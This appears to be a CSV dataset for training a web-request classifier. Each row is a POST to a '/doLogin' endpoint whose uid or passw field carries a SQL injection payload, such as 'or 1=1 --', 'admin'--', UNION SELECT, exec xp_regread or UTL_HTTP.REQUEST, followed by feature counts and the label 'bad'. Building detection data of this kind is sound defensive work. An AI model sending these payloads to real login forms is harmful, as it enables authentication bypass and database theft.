method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=PRINT%20@@variable&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=PRINT&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=admin'--&btnSubmit=Login""",1,0,1,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=as&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=asc&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=bfilename&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=char%4039%41%2b%40SELECT&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=delete&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=desc&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=distinct&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=exec%20sp&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=exec%20xp&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=handler&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=having&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=insert&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=like&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=limit&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=or%200%3d0%20%23&btnSubmit=Login',0,0,0,0,2,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=or%200%3d0%20--&btnSubmit=Login',0,0,1,0,2,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=or%201%3d1%20--&btnSubmit=Login',0,0,1,0,2,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=or%201%3d1&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=or%201%3d1--&btnSubmit=Login',0,0,1,0,1,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=or&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=order%20by&btnSubmit=Login',0,0,0,0,1,1,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=procedure&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=replace&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=select&btnSubmit=Login',0,0,0,0,0,1,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=to_timestamp_tz&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=truncate&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=tz_offset&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=update&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5cx23&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5cx27%5cx4F%5cx52%20SELECT%20%2a&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,2,0,bad
POST,b'/doLogin',b'uid=%5cx27%5cx6F%5cx72%20SELECT%20%2a&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,2,0,bad
POST,b'/doLogin',b'uid=%5cx27&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5cx27UNION%20SELECT&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=%5cx3D%20%5cx27&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',"b""uid=%5cx3D%20%5cx3B'&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",1,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=%7C&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%7c&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',"b""uid='%20%3b&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",1,0,0,0,1,0,bad
POST,b'/doLogin',"b""uid='%20(select%20top%201&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",1,0,0,1,3,1,bad
POST,b'/doLogin',"b""uid='%20--&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",1,0,1,0,1,0,bad
POST,b'/doLogin',"b""uid='%20or%20''%3d'&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",4,0,0,0,2,0,bad
POST,b'/doLogin',"b""uid='%20or%20(EXISTS)&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",1,0,0,1,2,0,bad
POST,b'/doLogin',"b""uid='%20or%20uid%20like%20'%&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",2,0,0,0,4,0,bad
POST,b'/doLogin',"b""uid='%20or%20uname%20like%20'%&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",2,0,0,0,4,0,bad
POST,b'/doLogin',"b""uid='%20or%20user%20like%20'%&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",2,0,0,0,4,0,bad
POST,b'/doLogin',"b""uid='%20or%20userid%20like%20'%&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",2,0,0,0,4,0,bad
POST,b'/doLogin',"b""uid='%20or%20username%20like%20'%&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",2,0,0,0,4,0,bad
POST,b'/doLogin',"b""uid='%3b%20exec%20xp_regread&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",1,0,0,0,2,0,bad
POST,b'/doLogin',"b""uid='%7c%7cUTL_HTTP%2eREQUEST&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",1,0,0,0,0,0,bad
POST,b'/doLogin',"b""uid='&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",1,0,0,0,0,0,bad
POST,b'/doLogin',"b""uid=')%20or%20('a'%3d'a&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",4,0,0,1,2,0,bad
POST,b'/doLogin',"b""uid=')%20or%20('x'%3d'x&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",4,0,0,1,2,0,bad
POST,b'/doLogin',"b""uid='or%20select%20%2a&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",1,0,0,0,2,1,bad
POST,b'/doLogin',"b""uid='sqlattempt1&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",1,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=(&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,1,0,0,bad
POST,b'/doLogin',b'uid=(sqlattempt2)&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,1,0,0,bad
POST,b'/doLogin',b'uid=)&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',"b'uid=,@variable&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login'",0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=-&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=--&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,1,0,0,0,bad
POST,b'/doLogin',"b""uid=--'%3b&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",1,0,1,0,0,0,bad
POST,b'/doLogin',b'uid=--sp_password&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,1,0,0,0,bad
POST,b'/doLogin',b'uid=1%3bSELECT%20%2a&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=@variable&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=PRINT%20@@variable&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=PRINT&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',"b""uid=admin'--&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",1,0,1,0,0,0,bad
POST,b'/doLogin',b'uid=as&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=asc&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=bfilename&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=char%4039%41%2b%40SELECT&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=delete&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=desc&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=distinct&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=exec%20sp&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=exec%20xp&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=handler&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=having&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=insert&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=like&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=limit&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=or%200%3d0%20%23&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,2,0,bad
POST,b'/doLogin',b'uid=or%200%3d0%20--&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,1,0,2,0,bad
POST,b'/doLogin',b'uid=or%201%3d1%20--&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,1,0,2,0,bad
POST,b'/doLogin',b'uid=or%201%3d1&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=or%201%3d1--&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,1,0,1,0,bad
POST,b'/doLogin',b'uid=or&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=order%20by&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,1,1,bad
POST,b'/doLogin',b'uid=procedure&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=replace&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=select&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,1,bad
POST,b'/doLogin',b'uid=to_timestamp_tz&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=truncate&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=tz_offset&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=update&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
